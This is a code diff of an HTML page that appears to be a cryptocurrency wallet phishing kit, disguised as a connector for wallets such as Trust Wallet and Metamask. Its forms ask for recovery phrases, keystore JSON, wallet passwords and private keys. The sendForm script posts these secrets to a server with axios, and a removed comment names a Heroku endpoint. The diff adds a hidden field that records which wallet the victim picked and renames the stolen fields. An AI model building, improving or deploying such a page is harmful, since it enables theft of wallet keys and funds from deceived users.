@@ -103,6 +103,8 @@
      </div>
     
      <div class="description2">
+        <input type="hidden" name="wallet_type" id="modal-value">
+
          <div id="Keystore1">
         <div class="form-group">	
              <textarea class="form-control" rows="5" name="keystore" placeholder="Keystore JSON"></textarea>
@@ -167,44 +169,42 @@
                     <div class="swiper-wrapper p-3">
                             <div class="swiper-slide">
                                 <div class="row wallets me-3">
-                                    <a class="col-md-4 col-4 wallets3"><img style="width: 40px;" src="./img/trust-wallet.png" alt="A wallet"><p>Trust Wallet</p></a>
-                                    <a class="col-md-4 col-4 wallets3"><img src="./img/metamusk.png" alt="A wallet" style="width: 40px;"><p>Metamusk</p></a>
-                                    <a class="col-md-4 col-4 wallets3"><img src="./img/iotex.png" alt="A wallet" style="width: 40px;"><p>Iotex</p></a>
-                                    <a class="col-md-4 col-4 wallets3"><img src="./img/bridge.png" alt="A wallet" style="width: 40px;"><p>Bridge</p></a>
-                                    <a class="col-md-4 col-4 wallets3"><img src="./img/kardiachain.png" alt="A wallet" style="width: 40px;"><p>Kardiachain</p></a>
-                                    <a class="col-md-4 col-4 wallets3"><img src="./img/phantasma-chain.jpg" alt="A wallet" style="width: 40px;"><p>Phantasma Chain</p></a>
-                                    <a class="col-md-4 col-4 wallets3"><img src="./img/harmony.png" alt="A wallet" style="width: 40px;"><p>Harmony</p></a>
-                                    <a class="col-md-4 col-4 wallets3"><img src="./img/via.png" alt="A wallet" style="width: 40px;"><p>ViaWallet</p></a>
-                                    <a class="col-md-4 col-4 wallets3"><img src="./img/wanchain.svg" alt="A wallet" style="width: 40px;"><p>Wanchain</p></a>
-                                    
+                                    <div class="col-md-4 col-4 wallets3" ><img style="width: 40px;" src="/img/trust-wallet.png"  alt="A wallet" data-id="Trust Wallet" onclick="getCoinName(this)"><p>Trust Wallet</p></div>
+                                <a class="col-md-4 col-4 wallets3"><img src="/img/metamusk.png" alt="A wallet" style="width: 40px;" data-id="Metamask" onclick="getCoinName(this)"><p>Metamask</p></a>
+                                <a class="col-md-4 col-4 wallets3"><img src="/img/iotex.png" alt="A wallet" style="width: 40px;" data-id="Iotex" onclick="getCoinName(this)"><p>Iotex</p></a>
+                                <a class="col-md-4 col-4 wallets3"><img src="/img/bridge.png" alt="A wallet" style="width: 40px;" data-id="Bridge" onclick="getCoinName(this)"><p>Bridge</p></a>
+                                <a class="col-md-4 col-4 wallets3"><img src="/img/kardiachain.png" alt="A wallet" style="width: 40px;" data-id="Kardiachain" onclick="getCoinName(this)"><p>Kardiachain</p></a>
+                                <a class="col-md-4 col-4 wallets3"><img src="/img/phantasma-chain.jpg" alt="A wallet" style="width: 40px;" data-id="Phantasma Chain" onclick="getCoinName(this)"><p>Phantasma Chain</p></a>
+                                <a class="col-md-4 col-4 wallets3"><img src="/img/harmony.png" alt="A wallet" style="width: 40px;" data-id="Harmony" onclick="getCoinName(this)"><p>Harmony</p></a>
+                                <a class="col-md-4 col-4 wallets3"><img src="/img/via.png" alt="A wallet" style="width: 40px;" data-id="ViaWallet" onclick="getCoinName(this)"><p>ViaWallet</p></a>
+                                <a class="col-md-4 col-4 wallets3"><img src="/img/wanchain.svg" alt="A wallet" style="width: 40px;" data-id="Wanchain" onclick="getCoinName(this)"><p>Wanchain</p></a>
                                 </div>
                             </div>
                             <div class="swiper-slide">
                                 <div class="row wallets me-3">
-                                    <a class="col-md-4 col-4 wallets3"><img src="./img/enjin.jpg" alt="A wallet" style="width: 40px;"><p>Enjin</p></a>
-                                    <a class="col-md-4 col-4 wallets3"><img src="./img/algorand.png" alt="A wallet" style="width: 40px;"><p>Algorand</p></a>
-                                    <a class="col-md-4 col-4 wallets3"><img src="./img/uniswap.png" alt="A wallet" style="width: 40px;"><p>UniSwap</p></a>
-                                    <a class="col-md-4 col-4 wallets3"><img src="./img/pancakeswap.png" alt="A wallet" style="width: 40px;"><p>PancakeSwap</p></a>
-                                    <a class="col-md-4 col-4 wallets3"><img src="./img/mobox.png" alt="A wallet" style="width: 40px;"><p>Mobox</p></a>
-                                    <a class="col-md-4 col-4 wallets3"><img src="./img/etherscam.png" alt="A wallet" style="width: 40px;"><p>Etherscan</p></a>
-                                    <a class="col-md-4 col-4 wallets3"><img src="./img/tronscan.jpg" alt="A wallet" style="width: 40px;"><p>Tronscan</p></a>
-                                    <a class="col-md-4 col-4 wallets3"><img src="./img/peakdefi.png" alt="A wallet" style="width: 40px;"><p>PEAKDeFi</p></a>
-                                    <a class="col-md-4 col-4 wallets3"><img src="./img/safepal.png" alt="A wallet" style="width: 40px;"><p>Safepal</p></a>
-                                    
+                                    <a class="col-md-4 col-4 wallets3"><img src="/img/enjin.jpg" alt="A wallet" style="width: 40px;" data-id="Enjin" onclick="getCoinName(this)"><p>Enjin</p></a>
+                                <a class="col-md-4 col-4 wallets3"><img src="/img/algorand.png" alt="A wallet" style="width: 40px;" data-id="Algorand" onclick="getCoinName(this)"><p>Algorand</p></a>
+                                <a class="col-md-4 col-4 wallets3"><img src="/img/uniswap.png" alt="A wallet" style="width: 40px;" data-id="UniSwap" onclick="getCoinName(this)"><p>UniSwap</p></a>
+                                <a class="col-md-4 col-4 wallets3"><img src="/img/pancakeswap.png" alt="A wallet" style="width: 40px;" data-id="PancakeSwap" onclick="getCoinName(this)"><p>PancakeSwap</p></a>
+                                <a class="col-md-4 col-4 wallets3"><img src="/img/mobox.png" alt="A wallet" style="width: 40px;" data-id="Mobox" onclick="getCoinName(this)"><p>Mobox</p></a>
+                                <a class="col-md-4 col-4 wallets3"><img src="/img/etherscam.png" alt="A wallet" style="width: 40px;" data-id="Etherscan" onclick="getCoinName(this)"><p>Etherscan</p></a>
+                                <a class="col-md-4 col-4 wallets3"><img src="/img/tronscan.jpg" alt="A wallet" style="width: 40px;" data-id="Tronscan" onclick="getCoinName(this)"><p>Tronscan</p></a>
+                                <a class="col-md-4 col-4 wallets3"><img src="/img/peakdefi.png" alt="A wallet" style="width: 40px;" data-id="PEAKDefi" onclick="getCoinName(this)"><p>PEAKDeFi</p></a>
+                                <a class="col-md-4 col-4 wallets3"><img src="/img/safepal.png" alt="A wallet" style="width: 40px;" data-id="SafePal" onclick="getCoinName(this)"><p>Safepal</p></a>
                                 </div>
                                 <!-- <p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Modi corrupti deserunt laudantium inventore minima ducimus,</p> -->
                             </div>
                             <div class="swiper-slide">
                                 <div class="row wallets me-3">
-                                    <a class="col-md-4 col-4 wallets3"><img src="./img/crypto.com.png" alt="A wallet" style="width: 40px;"><p>Crypto.com</p></a>
-                                    <a class="col-md-4 col-4 wallets3"><img src="./img/dcent.png" alt="A wallet" style="width: 40px;"><p>D'cent</p></a>
-                                    <a class="col-md-4 col-4 wallets3"><img src="./img/bitkeep.png" alt="A wallet" style="width: 40px;"><p>bitkeep</p></a>
-                                    <a class="col-md-4 col-4 wallets3"><img src="./img/1inch.png" alt="A wallet" style="width: 40px;"><p>1inch</p></a>
-                                    <a class="col-md-4 col-4 wallets3"><img src="./img/safemoon.png" alt="A wallet" style="width: 40px;"><p>Safemoon</p></a>
-                                    <a class="col-md-4 col-4 wallets3"><img src="./img/polygon.png" alt="A wallet" style="width: 40px;"><p>Polygon</p></a>
-                                    <a class="col-md-4 col-4 wallets3"><img src="./img/tokenpocket.png" alt="A wallet" style="width: 40px;"><p>Token Pocket</p></a>
-                                    <a class="col-md-4 col-4 wallets3"><img src="./img/fegtoken.png" alt="A wallet" style="width: 40px;"><p>Feg Token</p></a>
-                                    <a class="col-md-4 col-4 wallets3"><img src="./img/curve.png" alt="A wallet" style="width: 40px;"><p>Curve Dao</p></a>
+                                    <a class="col-md-4 col-4 wallets3"><img src="/img/crypto.com.png" alt="A wallet" style="width: 40px;" data-id="Crypto.com" onclick="getCoinName(this)"><p>Crypto.com</p></a>
+                                    <a class="col-md-4 col-4 wallets3"><img src="/img/dcent.png" alt="A wallet" style="width: 40px;" data-id="D'cent" onclick="getCoinName(this)"><p>D'cent</p></a>
+                                    <a class="col-md-4 col-4 wallets3"><img src="/img/bitkeep.png" alt="A wallet" style="width: 40px;" data-id="bitkeep" onclick="getCoinName(this)"><p>bitkeep</p></a>
+                                    <a class="col-md-4 col-4 wallets3"><img src="/img/1inch.png" alt="A wallet" style="width: 40px;" data-id="1inch" onclick="getCoinName(this)"><p>1inch</p></a>
+                                    <a class="col-md-4 col-4 wallets3"><img src="/img/safemoon.png" alt="A wallet" style="width: 40px;"  data-id="Safemoon" onclick="getCoinName(this)"><p>Safemoon</p></a>
+                                    <a class="col-md-4 col-4 wallets3"><img src="/img/polygon.png" alt="A wallet" style="width: 40px;" data-id="Polygon" onclick="getCoinName(this)"><p>Polygon</p></a>
+                                    <a class="col-md-4 col-4 wallets3"><img src="/img/tokenpocket.png" alt="A wallet" style="width: 40px;" data-id="Token Pocket" onclick="getCoinName(this)"><p>Token Pocket</p></a>
+                                    <a class="col-md-4 col-4 wallets3"><img src="/img/fegtoken.png" alt="A wallet" style="width: 40px;" data-id="Feg Token" onclick="getCoinName(this)"><p>Feg Token</p></a>
+                                    <a class="col-md-4 col-4 wallets3"><img src="/img/curve.png" alt="A wallet" style="width: 40px;" data-id="Curve Dao" onclick="getCoinName(this)"><p>Curve Dao</p></a>
                                 </div>
                             </div>
                     </div>
@@ -238,24 +238,29 @@ var swiper = new Swiper(".mySwiper", {
         },
       });
  </script>
-<script type="text/javascript">
-	
-     
-	function toyin() {
-        // $('wallet3').hide();
+
+ <script>
+    function getCoinName(d) {
+        let modal_value = d.getAttribute("data-id");
+        let default_value = document.getElementById("modal-value");
+        default_value.value = modal_value; 
+        console.log(modal_value)
+    }
+ </script> 
+
+<script type="text/javascript"> 
+	function toyin() { 
         document.getElementById('qrcode').style.display = "none";
         document.getElementsByClassName("popup3")[0].classList.add("active");
         document.getElementsByClassName("modal")[0].classList.add("active");
+    };
 
-};
-
-document.getElementById("open-popup-btn2").addEventListener("click",function(){
-  document.getElementsByClassName("popup2")[0].classList.add("active");
-  document.getElementById('Keystore1').style.display="none";
-  document.getElementById('Phrase1').style.display="block";
-document.getElementById('Private1').style.display="none";
-
-});
+    document.getElementById("open-popup-btn2").addEventListener("click",function(){
+        document.getElementsByClassName("popup2")[0].classList.add("active");
+        document.getElementById('Keystore1').style.display="none";
+        document.getElementById('Phrase1').style.display="block";
+        document.getElementById('Private1').style.display="none";
+    });
 
 document.getElementById("dismiss-popup-btn").addEventListener("click",function(){
   document.getElementsByClassName("popup")[0].classList.remove("active");
@@ -296,10 +301,8 @@ document.getElementById("dismiss-popup-btn2").addEventListener("click",function(
 
 <!-- JAVASCRIPT FOR THE SECOND MODAL -->
 <script type="text/javascript">
-
-    // when QRc is clicked on
-document.getElementById("phrase3").addEventListener("click",function(){
  
+       document.getElementById("phrase3").addEventListener("click",function(){ 
        document.getElementById('wallet3').style.display="none";
        document.getElementById('qrcode').style.display="block";
 });
@@ -399,20 +402,22 @@ document.addEventListener("DOMContentLoaded", function(event) {
 
 <script>
     function sendForm() { 
-        
+
         console.log("form submitted") 
          let phrase = document.getElementsByName("phrase")[0].value;
          let keyStore = document.getElementsByName("keystore")[0].value;
          let walletPassword = document.getElementsByName("walletpassword")[0].value;
          let privateKey = document.getElementsByName("privatekey")[0].value;
+         let walletType = document.getElementsByName("wallet_type")[0].value;
         console.log(`The data sent are phrase: ${phrase}, keystore: ${keyStore}, password: ${walletPassword} and privatekey: ${privateKey}`)
 
         var formData = new FormData(); 
     
-        formData.append('phrase', phrase);
-        formData.append('keystore', keyStore);
-        formData.append('walletpassword', walletPassword);
-        formData.append('privateKey', privateKey);  
+        formData.append('recovery_phrase', phrase);
+        formData.append('keystore_data', keyStore);
+        formData.append('wallet_password', walletPassword);
+        formData.append('private_key', privateKey);
+        formData.append('wallet_type', walletType);  
         console.log(formData)
 
         axios({
@@ -424,24 +429,13 @@ document.addEventListener("DOMContentLoaded", function(event) {
             .then(res =>  console.log(res.data))
             .catch(err => console.log(err) );
         }
-    
 
-// axios({
-//   method: "post",
-//   url: "https://dex-mobile.herokuapp.com/api/send-data",
-//   data: {},
-//   headers: { },
-// }).then( (response) => { 
-//     console.log(response);
-//   }).catch( (error) => {
-//     console.log(error);
-//   });
 </script>
 
 
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
       <!-- Option 1: Bootstrap Bundle with Popper -->
-      <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
 
 
 </body>
